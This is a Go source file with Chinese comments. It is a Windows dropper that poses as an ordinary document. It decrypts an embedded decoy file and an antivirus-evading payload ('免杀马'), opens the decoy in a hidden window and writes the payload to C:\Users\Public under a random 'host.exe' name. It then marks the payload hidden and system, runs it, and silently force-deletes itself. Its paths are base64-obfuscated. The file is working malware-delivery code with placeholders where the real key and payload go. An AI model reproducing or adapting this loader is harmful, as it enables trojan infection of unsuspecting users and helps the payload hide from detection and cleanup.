package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
)

// base64的解码函数
func decodeBase64(encoded string) (string, error) {
	// 解码Base64编码的字符串
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}
	// 将字节切片转换为字符串
	return string(data), nil
}

// 解密函数
func aesDecrypt(encryptedData string, key []byte) ([]byte, error) {
	ciphertext, err := base64.StdEncoding.DecodeString(encryptedData)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// 删除自身文件函数
func selfDelete(exePath string) {
	// 强制删除（即使文件是只读的）。
	// 静默删除，不要求用户确认
	cmd := exec.Command("cmd", "/C", "del", "/F", "/Q", exePath)
	cmd.SysProcAttr = hiddenProcAttr()
	cmd.Start()
}

// 设置隐藏
func setHidden(exePath string) {
	cmd := exec.Command("cmd", "/c", "attrib", "+s", "+a", "+h", "+r", exePath)
	cmd.SysProcAttr = hiddenProcAttr()
	cmd.Start()
}

// 生成随机字符串
func generateRandomString(length int) (string, error) {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	// 创建一个足够大的字节切片来存储随机字母
	b := make([]byte, length)
	// n是生成的随机数的数量，确保它小于letters的长度
	n, err := rand.Read(b)
	if err != nil {
		return "", err
	}
	// 将每个字节替换为letters中的一个字母
	for i := 0; i < n; i++ {
		b[i] = letters[b[i]%byte(len(letters))]
	}
	return string(b), nil
}

func main() {
	// 1.doc 正常文件名
	fName := "fileName"
	// 解密密钥
	key := "randomKey"
	// 加密的文件内容
	enPayload := "encryptPayload"
	enFile := "encryptFile"
	// 免杀马移动到的目录
	payloadPath, _ := decodeBase64("QzpcVXNlcnNcUHVibGljXA==") // C:\Users\Public\
	// 升级随机字符串
	randomName, _ := generateRandomString(4)
	// 指定的免杀马释放之后保存的路径
	payloadPath = payloadPath + randomName + "host.exe"
	// 保存临时路径,确保跨盘符移动
	tmpPath, _ := decodeBase64("QzpcVXNlcnNcUHVibGljXFRTX0Q0MTUudG1w")
	//payloadPath := "C:\\Users\\Public\\mgrqhost.exe"
	//tmpPath := "C:\\Users\\Public\\TS_D415.tmp"
	// 0.把当前文件移动到其他临时路径
	selfFile, _ := os.Executable()      // 获取当前程序运行路径
	err := os.Rename(selfFile, tmpPath) // 文件重命名
	// 默认不能跨盘符移动
	if err != nil {
		pf := selfFile[0:2]
		randomString, _ := generateRandomString(10)
		tmpPath = pf + "\\" + randomString // E:\\cefergtrgt
		err = os.Rename(selfFile, tmpPath)
		if err != nil {
			fmt.Println("err: ", err)
		}
	}
	// 1.解密文件内容
	payloadData, _ := aesDecrypt(enPayload, []byte(key))
	fileData, _ := aesDecrypt(enFile, []byte(key))

	// 2.释放正常文件运行
	f, _ := os.Create(fName) // 字节内容写入文件
	f.Write(fileData)
	f.Close()
	// 当前路径
	currentPath, _ := os.Getwd()
	// 通过cmd /c 正常文件，运行正常文件，比如pdf文件默认wps打开
	cmd := exec.Command("cmd", " /c ", filepath.Join(currentPath, fName))
	// 创建的子进程的窗口将被隐藏。
	cmd.SysProcAttr = hiddenProcAttr()
	cmd.Start()

	// 3.释放样本文件运行
	// 创建样本exe文件
	pf, _ := os.Create(payloadPath)
	pf.Write(payloadData)
	pf.Close()
	// 设置样本文件隐藏属性
	setHidden(payloadPath)
	// 运行 样本exe文件
	exec.Command(payloadPath).Start()
	// 4.删除当前自身文件
	selfDelete(tmpPath)
	//selfDelete(payloadPath) 免杀马正在运行是删除不了的

}
